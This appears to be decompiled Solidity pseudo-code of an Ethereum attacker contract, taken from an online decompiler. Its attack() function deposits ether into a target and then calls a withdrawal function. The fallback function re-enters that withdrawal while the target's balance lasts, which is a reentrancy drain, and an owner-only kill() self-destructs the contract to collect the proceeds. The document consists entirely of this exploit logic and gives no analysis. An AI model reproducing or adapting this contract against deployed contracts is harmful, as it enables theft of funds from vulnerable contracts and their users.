// Decompiled at www.contract-library.com

// Data structures and variables inferred from the use of storage instructions
uint256 kill; // 0x0
uint256 attack; // 0x1

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.
function __function_selector__(uint32 function_selector) public {
  MEM[0x40] = 0x60;
  if (msg.data.length()) {
    if ((function_selector == 0x41c0e1b5)) kill()();
    if ((0x9e5faafc == function_selector)) attack()();
    if ((0xf66ad59a == function_selector)) 0xf66ad59a(function_selector);
  }
  if ((BALANCE(address(attack)) >= msg.value)) {
    v00x52 = (msg.gas >= 0x9c40);
  }
  if (v00x52) {
    v00x6b = MEM[0x40];
    MEM[v00x6b] = 0xccd6e5b600000000000000000000000000000000000000000000000000000000;
    MEM[v00x6b + 4] = msg.value;
    MEM[v00x6b + 36] = address(this);
    require(isContract(address(attack)));
    require(address(attack).call(MEM[MEM[0x40] : MEM[0x40] + ((v00x6b - MEM[0x40]) + 0x44)]).gas(msg.gas - 50));
  }
  exit();
}

function kill() public {
  require(!msg.value);
  vc70xcd = 0xc5;
  if ((address(kill) != address(msg.sender))) {
    exit();
  } else {
    selfdestruct(address(kill));
  }
}

function attack() public {
  vd60x138 = MEM[0x40];
  MEM[vd60x138] = 0xd0e30db000000000000000000000000000000000000000000000000000000000;
  require(isContract(address(attack)));
  require(address(attack).call(MEM[MEM[0x40] : MEM[0x40] + ((vd60x138 - MEM[0x40]) + 0x4)]).value(msg.value).gas(msg.gas - 9050));
  vd60x19e = MEM[0x40];
  MEM[vd60x19e] = 0xccd6e5b600000000000000000000000000000000000000000000000000000000;
  MEM[vd60x19e + 4] = msg.value;
  MEM[vd60x19e + 36] = address(this);
  require(isContract(address(attack)));
  require(address(attack).call(MEM[MEM[0x40] : MEM[0x40] + ((vd60x19e - MEM[0x40]) + 0x44)]).gas(msg.gas - 50));
  exit();
}

function 0xf66ad59a() public {
  require(!msg.value);
  ve00x205 = address(attack);
  ve00xf1 = MEM[0x40];
  MEM[ve00xf1] = address(ve00x205);
  return(MEM[MEM[0x40]:MEM[0x40] + (0x20 + (ve00xf1 - MEM[0x40]))]);
}

